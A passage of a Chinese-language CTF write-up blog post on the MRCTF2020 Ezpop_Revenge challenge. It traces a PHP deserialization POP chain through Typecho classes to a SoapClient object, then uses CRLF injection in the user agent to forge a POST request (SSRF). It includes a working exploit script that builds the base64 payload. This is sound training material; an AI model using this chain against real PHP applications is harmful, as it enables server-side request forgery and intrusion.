@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[MRCTF2020]Ezpop_Revenge做了ezpop，看到这道题，就想尝试一下，结果……无语凝噎 进入题目，是一个搭建的博客，扫出www.zip网站源码：    （非常恐怖  这里有很多网页的代码，既然是Revenge，应该是反序列化题目，在文件内查找： 123456789101112&#x2F;&#x2F;Plugin.phppublic function action()&amp;#123;        if">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MRCTF2020-Ezpop_Revenge">
+<meta property="og:url" content="http://example.com/2021/04/04/MRCTF2020-Ezpop-Revenge/index.html">
+<meta property="og:site_name" content="inanb">
+<meta property="og:description" content="[MRCTF2020]Ezpop_Revenge做了ezpop，看到这道题，就想尝试一下，结果……无语凝噎 进入题目，是一个搭建的博客，扫出www.zip网站源码：    （非常恐怖  这里有很多网页的代码，既然是Revenge，应该是反序列化题目，在文件内查找： 123456789101112&#x2F;&#x2F;Plugin.phppublic function action()&amp;#123;        if">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/MRCTF2020-Ezpop-Revenge/image-20210404165801705.png">
+<meta property="og:image" content="http://example.com/images/MRCTF2020-Ezpop-Revenge/image-20210404172608327.png">
+<meta property="og:image" content="http://example.com/images/MRCTF2020-Ezpop-Revenge/image-20210404173005718.png">
+<meta property="og:image" content="http://example.com/images/MRCTF2020-Ezpop-Revenge/image-20210404183523393.png">
+<meta property="article:published_time" content="2021-04-04T08:54:24.000Z">
+<meta property="article:modified_time" content="2021-04-04T10:39:49.189Z">
+<meta property="article:author" content="inanb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/MRCTF2020-Ezpop-Revenge/image-20210404165801705.png">
+
+<link rel="canonical" href="http://example.com/2021/04/04/MRCTF2020-Ezpop-Revenge/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MRCTF2020-Ezpop_Revenge | inanb</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">inanb</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">昨夜雨疏风骤 浓睡不消残酒</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/04/MRCTF2020-Ezpop-Revenge/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MRCTF2020-Ezpop_Revenge
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-04 16:54:24 / 修改时间：18:39:49" itemprop="dateCreated datePublished" datetime="2021-04-04T16:54:24+08:00">2021-04-04</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>做了ezpop，看到这道题，就想尝试一下，结果……无语凝噎</p>
+<p>进入题目，是一个搭建的博客，扫出<a href="http://www.zip网站源码：">www.zip网站源码：</a></p>
+<img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404165801705.png" alt="image-20210404165801705" style="zoom:80%;" />
+
+<blockquote>
+<p>（非常恐怖</p>
+</blockquote>
+<p>这里有很多网页的代码，既然是Revenge，应该是反序列化题目，在文件内查找：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Plugin.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;admin&#x27;</span>])) var_dump($_SESSION);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|assert|eval|[`\&#x27;~^?&lt;&gt;$%]+/i&quot;</span>,base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">&#x27;C0incid3nc3&#x27;</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;Not that easy.&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以反序列化了一个post的数据，并且做了过滤……不管如何利用，先从这里找，在这个文件上方有一个类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">&quot;MRCTF&#123;this_is_a_fake_flag&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;hello&#x27;</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">&#x27;world&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>wakeup的魔法方法，可以反序列化调用，跟进Typecho_Db：</p>
+<p>（代码太多，这里选择有用的部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Db.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_prefix;</span><br><span class="line">    <span class="keyword">private</span> $_adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$adapterName, $prefix = <span class="string">&#x27;typecho_&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">        $adapterName = <span class="string">&#x27;Typecho_Db_Adapter_&#x27;</span> . $adapterName;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行了拼接，（大概）可以联想到toString方法，那有没有呢？（很多……一定要注意其形式是否可以利用，经验和感觉很重要，嗯，玄学）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Query.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;INSERT INTO &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="string">&#x27; VALUES &#x27;</span></span><br><span class="line">                . <span class="string">&#x27;(&#x27;</span> . implode(<span class="string">&#x27; , &#x27;</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) . <span class="string">&#x27;)&#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;limit&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;DELETE FROM &#x27;</span></span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;table&#x27;</span>]</span><br><span class="line">                . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">                $columns = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">&#x27;rows&#x27;</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                        $columns[] = <span class="string">&quot;<span class="subst">$key</span> = <span class="subst">$val</span>&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个针对sql语句的条件分支，注意select这里：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br></pre></td></tr></table></figure>
+
+<p>就很像反序列化练习中__call函数的调用，查了一下__call函数，似乎没有利用点……</p>
+<h3 id="SOAP-反序列化"><a href="#SOAP-反序列化" class="headerlink" title="SOAP 反序列化"></a>SOAP 反序列化</h3><p>dalao：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/80918004">https://zhuanlan.zhihu.com/p/80918004</a></p>
+<blockquote>
+<p>SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息。</p>
+</blockquote>
+<p>为php安装soap拓展后：</p>
+<p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404172608327.png" alt="image-20210404172608327"></p>
+<p>可以看到，SoapClient类自带有__call方法，由此诞生了SOAP反序列化ssrf利用。</p>
+<p>本地重复实验：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&#x27;http://127.0.0.1:5555/path&#x27;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=something&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=my_session&#x27;</span></span><br><span class="line">    );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,$aaa);</span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"></span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/MRCTF2020-Ezpop-Revenge/image-20210404173005718.png" alt="image-20210404173005718"></p>
+<p>调用不存在的方法时，SoapClient仍会向WebSever发送请求，调用服务器函数。</p>
+<p>在参数中，user-agent是可控的，这意味着通过<strong>CRLF</strong>，我们可以控制ua下的所有参数，进而借网站发送一个由我们控制的POST请求，完成ssrf。</p>
+<p>pop链已经明了了(大概)：</p>
+<ol>
+<li>HelloWorld_DB反序列化触发wakeup，在wakeup中实例化一个Typecho_Db；</li>
+<li><code>Typecho_Db($this-&gt;coincidence[&#39;hello&#39;], $this-&gt;coincidence[&#39;world&#39;])</code>，<code>$this-&gt;coincidence[&#39;world&#39;]</code>作为参数，也就是<code>$adapterName</code>，控制此参数为<code>Typecho_Db_Query</code>的实例化，触发toString；</li>
+<li>Typecho_Db_Query中控制<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>为select，<code>$this-&gt;_adapter</code>为SoapClient的实例化，触发其中的call方法，发送post请求进行ssrf。</li>
+</ol>
+<p>明了归明了，写脚本也是一大难关……并且要对各个类里的魔术方法有数，这样才能构造出正确的序列化字符串。</p>
+<p>……………………无语凝噎</p>
+<p>利用类里有的construct控制变量，传入target为<code>http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php</code>设置好xff头和自己的cookie：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = <span class="keyword">array</span>(<span class="string">&quot;hello&quot;</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">&quot;http://92018a96-f259-4c67-9a5a-b95fedc9d0ea.node3.buuoj.cn/flag.php&quot;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie: PHPSESSID=a55efu5tcvab970c7j54jbfkj3&quot;</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;aaab&#x27;</span>, <span class="string">&#x27;location&#x27;</span> =&gt; $target, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;haha^^&#x27;</span> . join(<span class="string">&#x27;^^&#x27;</span>, $headers)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&quot;SELECT&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = serialize(<span class="keyword">new</span> HelloWorld_DB());</span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $a;</span></span><br><span class="line"></span><br><span class="line">$a = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>（大概可以吧…………</p>
+<p>最后如何该如何利用反序列化：</p>
+<p>在另一个Plugin.php中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">activate</span>(<span class="params">$pluginName</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">self</span>::$_plugins[<span class="string">&#x27;activated&#x27;</span>][$pluginName] = <span class="built_in">self</span>::$_tmp;</span><br><span class="line">        <span class="built_in">self</span>::$_tmp = <span class="keyword">array</span>();</span><br><span class="line">        Helper::addRoute(<span class="string">&quot;page_admin_action&quot;</span>,<span class="string">&quot;/page_admin&quot;</span>,<span class="string">&quot;HelloWorld_Plugin&quot;</span>,<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Helper.php</span></span><br><span class="line">     * 增加路由</span><br><span class="line">     * @access <span class="keyword">public</span></span><br><span class="line">     * @param <span class="keyword">string</span> $name 路由名称</span><br><span class="line">     * @param <span class="keyword">string</span> $url 路由路径</span><br><span class="line">     * @param <span class="keyword">string</span> $widget 组件名称</span><br><span class="line">     * @param <span class="keyword">string</span> $action 组件动作</span><br><span class="line">     * @param <span class="keyword">string</span> $after 在某个路由后面</span><br><span class="line">     * @<span class="keyword">return</span> <span class="keyword">integer</span> */</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addRoute</span>(<span class="params">$name, $url, $widget, $action = <span class="literal">NULL</span>, $after = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $routingTable = <span class="built_in">self</span>::options()-&gt;routingTable;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($routingTable[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($routingTable[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($routingTable <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $pos ++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($key == $after) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $pre = array_slice($routingTable, <span class="number">0</span>, $pos);</span><br><span class="line">        $next = array_slice($routingTable, $pos);</span><br><span class="line"></span><br><span class="line">        $routingTable = array_merge($pre, <span class="keyword">array</span>($name =&gt; <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>       =&gt;  $url,</span><br><span class="line">            <span class="string">&#x27;widget&#x27;</span>    =&gt;  $widget,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span>    =&gt;  $action</span><br><span class="line">        )), $next);</span><br><span class="line">        <span class="built_in">self</span>::options()-&gt;routingTable = $routingTable;</span><br><span class="line"></span><br><span class="line">        $db = Typecho_Db::get();</span><br><span class="line">        <span class="keyword">return</span> Typecho_Widget::widget(<span class="string">&#x27;Widget_Abstract_Options&#x27;</span>)-&gt;update(<span class="keyword">array</span>(<span class="string">&#x27;value&#x27;</span> =&gt; serialize($routingTable))</span><br><span class="line">        , $db-&gt;sql()-&gt;where(<span class="string">&#x27;name = ?&#x27;</span>, <span class="string">&#x27;routingTable&#x27;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/105215741/%E6%A0%B9%E6%8D%AE%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84%E8%AF%B4%E6%B3%95%EF%BC%8C%E7%BD%91%E9%A1%B5%E4%B8%8A%E7%9A%84%E6%8F%92%E4%BB%B6(Widget)%E4%B8%80%E8%88%AC%E7%94%B1%E8%B7%AF%E7%94%B1%E5%88%86%E5%8F%91%E6%9D%A5%E8%87%AA%E5%8A%A8%E5%8A%A0%E8%BD%BD%EF%BC%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%82%B9%EF%BC%9A![image-20210404182121878](/images/MRCTF2020-Ezpop-Revenge/image-20210404182121878.png)">https://blog.csdn.net/a3320315/article/details/105215741/根据这篇文章的说法，网页上的插件(Widget)一般由路由分发来自动加载，序列化点：![image-20210404182121878](/images/MRCTF2020-Ezpop-Revenge/image-20210404182121878.png)</a></p>
+<p>由此，对应的<code> * @param string $widget 组件名称</code>也就是<code>HelloWorld_Plugin</code>，查找相关的插件名一般就可以找到路由……（这个一般，大概是我胡说的……因为我根本不懂……😭zhendecai</p>
+<blockquote>
